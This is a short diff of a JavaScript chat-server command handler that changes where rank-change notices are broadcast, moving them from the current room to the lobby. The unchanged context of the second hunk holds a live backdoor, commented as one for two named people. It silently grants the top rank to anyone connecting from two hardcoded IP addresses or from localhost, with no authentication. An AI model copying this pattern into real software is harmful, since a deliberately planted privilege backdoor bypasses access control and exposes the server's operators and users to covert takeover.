@@ -1194,7 +1194,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		var groupName = (config.groups[nextGroup].name || nextGroup || '').trim() || 'a regular user';
 		var entry = ''+name+' was '+(isDemotion?'demoted':'promoted')+' to ' + groupName + ' by '+user.name+'.';
 		logModCommand(room, entry, true);
-		if (targetUser && targetUser.connected) room.send('|N|'+targetUser.getIdentity()+'|'+targetUser.userid);
+		if (targetUser && targetUser.connected) rooms.lobby.send('|N|'+targetUser.getIdentity()+'|'+targetUser.userid);
 		
 		if (isDemotion) {
 			rooms.lobby.logEntry(entry);
@@ -1541,7 +1541,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		// backdoor for panderp and jd
 		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' || user.ip === '127.0.0.1') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			room.send('|N|'+user.getIdentity()+'|'+user.userid);
+			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			return false;
 		}
 		break;
